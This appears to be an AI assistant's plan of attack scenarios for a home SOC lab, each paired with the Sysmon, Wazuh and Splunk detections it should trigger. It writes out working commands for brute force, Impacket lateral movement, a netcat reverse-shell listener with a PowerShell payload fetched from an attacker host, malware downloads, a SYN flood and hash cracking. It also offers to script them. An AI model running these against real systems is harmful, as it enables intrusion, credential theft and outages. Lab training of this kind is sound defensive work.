Below is a **clear, practical list of attack scenarios** you can execute in the Phở Anh Hai SOC Lab.  
Each scenario includes:  
✔ Attack name  
✔ Tools used  
✔ Commands  
✔ Optional vulnerable setup on Windows Server / POS  
✔ What logs / detections you expect

Designed to match your installed toolset **exactly** and produce maximum SOC telemetry (Sysmon, Wazuh, Splunk).

---

# 🔥 **ATTACK SCENARIO PACK FOR YOUR LAB (Based on Installed Tools)**

---

# **1️⃣ Network Reconnaissance (Nmap)**

### **Goal:** Identify active hosts & open ports in the SOC LAN

### **Tools:** `nmap`

### **Commands**

```
nmap -sn 192.168.10.0/24
nmap -sV -sC -O 192.168.10.20
nmap -sV -sC 192.168.10.50
```

### **Target Prep:** none

### **Expected Detection:**

- Sysmon Event ID 3 (network)
    
- Wazuh “Port scanning activity”
    
- Splunk correlation spike
    

---

# **2️⃣ Windows Domain Username Enumeration (Kerbrute)**

### **Goal:** Enumerate valid AD usernames

### **Tools:** `kerbrute`

### **Command**

```
kerbrute userenum users.txt -d phoanhhai.local --dc 192.168.10.20
```

### **Target Prep:**

✔ Enable AD audit policy (Success + Failure)  
✔ Ensure weak/guessable usernames exist

### **Expected Detection:**

- DC Event ID 4768/4771 (Kerberos)
    
- Wazuh MITRE ATT&CK T1087 (Account discovery)
    

---

# **3️⃣ SMB Enumeration (enum4linux, smbclient, smbmap)**

### **Tools:** `enum4linux`, `smbclient`, `smbmap`

### **Commands**

```
enum4linux -a 192.168.10.20

smbclient -L //192.168.10.20/
smbmap -H 192.168.10.20
```

### **Target Prep:**

✔ Create a share on DC: `C:\PublicShare`  
✔ Permissions: Everyone → Read

### **Expected Detection:**

- Event ID 4624 (logon)
    
- Event ID 5140 (SMB share enumeration)
    
- Wazuh “SMB enumeration attempt”
    

---

# **4️⃣ SMB Brute Force (Hydra + SMB)**

### **Goal:** Password attacks on DC or POS

### **Tools:** `hydra`, `crackmapexec`

### **Commands**

```
hydra -L users.txt -P passwords.txt smb://192.168.10.20
crackmapexec smb 192.168.10.20 -u users.txt -p passwords.txt
```

### **Target Prep:**

✔ Disable account lockout temporarily  
✔ Use weak passwords: `Password1`, `Pho2025!`, etc.

### **Expected Detection:**

- Event ID 4625 spike
    
- Wazuh brute-force rule (T1110)
    

---

# **5️⃣ RDP Brute Force (Hydra)**

### **Tools:** `hydra`

### **Command**

```
hydra -L users.txt -P passwords.txt rdp://192.168.10.50
```

### **Target Prep:**

✔ Ensure RDP enabled in System → Remote Desktop  
✔ Firewall inbound RDP allow (3389)

### **Expected Detection:**

- Event ID 4625 (failed RDP)
    
- Wazuh brute-force alerts
    
- High failed login count in Splunk
    

---

# **6️⃣ Web App Scanning / Directory Discovery (Gobuster, Wfuzz, Nikto)**

_(Only if your POS or DC hosts a simple HTTP server)_

### **Tools:** `gobuster`, `wfuzz`, `nikto`

### **Commands**

```
gobuster dir -u http://192.168.10.50 -w /usr/share/seclists/Discovery/Web-Content/common.txt
nikto -h http://192.168.10.50
```

### **Target Prep:**

✔ Install IIS or Python SimpleHTTPServer on POS:

```
python3 -m http.server 80
```

### **Expected Detection:**

- Sysmon Event ID 3 (mass scanning)
    
- Wazuh → Reconnaissance detection
    

---

# **7️⃣ SQL Injection Testing (SQLmap)**

_(Only applicable if you host a web app on POS)_

### **Tools:** `sqlmap`

### **Command**

```
sqlmap -u "http://192.168.10.50/login.php?user=1" --batch --dbs
```

### **Target Prep:**

✔ Install DVWA or a vulnerable PHP app on Windows/POS  
✔ Weak database creds like `root:root`

### **Expected Detection:**

- Traffic anomalies
    
- Sysmon network logs
    
- Application log errors (if enabled)
    

---

# **8️⃣ Lateral Movement (Impacket – psexec, smbexec, wmiexec)**

### **Tools:** `impacket-psexec`, `impacket-wmiexec`

### **Commands**

```
psexec.py phoanhhai.local/user:Password1@192.168.10.20
wmiexec.py phoanhhai.local/user:Password1@192.168.10.50
```

### **Target Prep:**

✔ Enable ADMIN$ share  
✔ Ensure the attacker has stolen or brute-forced a valid credential

### **Expected Detection:**

- Event ID 4624 (Type 3)
    
- Event ID 4672 (special privileges)
    
- Sysmon Event ID 1 (psexec service creation)
    
- Wazuh MITRE: T1021, T1569
    

---

# **9️⃣ Reverse Shell Delivery (nc + PowerShell)**

### **Tools:** `netcat`, PowerShell

### **Attacker Listener**

```
nc -lvnp 4444
```

### **Windows Target Execution**

PowerShell:

```
powershell -c "Invoke-WebRequest http://192.168.10.X/shell.ps1 -OutFile shell.ps1"
powershell -c "./shell.ps1"
```

### **Expected Detection:**

- Sysmon → Network connection
    
- Sysmon → Suspicious PowerShell
    
- Wazuh MITRE T1059 (Command Execution)
    

---

# **🔟 File Transfer & Enumeration (curl, wget)**

### **Tools:** `curl`, `wget`

### **Commands**

```
wget http://192.168.10.X/evil.exe
curl http://192.168.10.X/payload -o payload.exe
```

### **Target Prep:**

✔ Host files from attacker using:

```
python3 -m http.server 80
```

### **Expected Detection:**

- Sysmon Event ID 11 (FileCreate)
    
- Wazuh → FIM & suspicious file detection
    

---

# **1️⃣1️⃣ DOS & Traffic Flooding (hping3)**

### **Tools:** `hping3`

### **Command**

```
sudo hping3 -S --flood -p 80 192.168.10.50
```

### **Target Prep:**

✔ Ensure POS runs a web service (optional)

### **Expected Detection:**

- High network traffic
    
- Sysmon network spam
    
- Wazuh anomalous behavior alerts
    

---

# **1️⃣2️⃣ Password Cracking (John, Hashcat)**

### **Goal:** Practice offline password cracking

### **Tools:** `john`, `hashcat`

### **Commands**

```
john hash.txt
hashcat -m 1000 hashes.txt rockyou.txt
```

### **Target Prep:**

✔ Extract NTLM hashes via Impacket’s `secretsdump.py`

### **Expected Detection:**

No on-host logs (offline attack).  
SOC learns **post-exploitation workflow**.

---

# ✔️ Want me to turn these into:

- A **PDF “attack runbook”** for your group?
    
- A **PowerPoint attack timeline**?
    
- A **Bash script to automate all attacks**?
    
- A **Blue Team detection checklist (Splunk queries)**?
    

Just tell me — I can generate any version you want.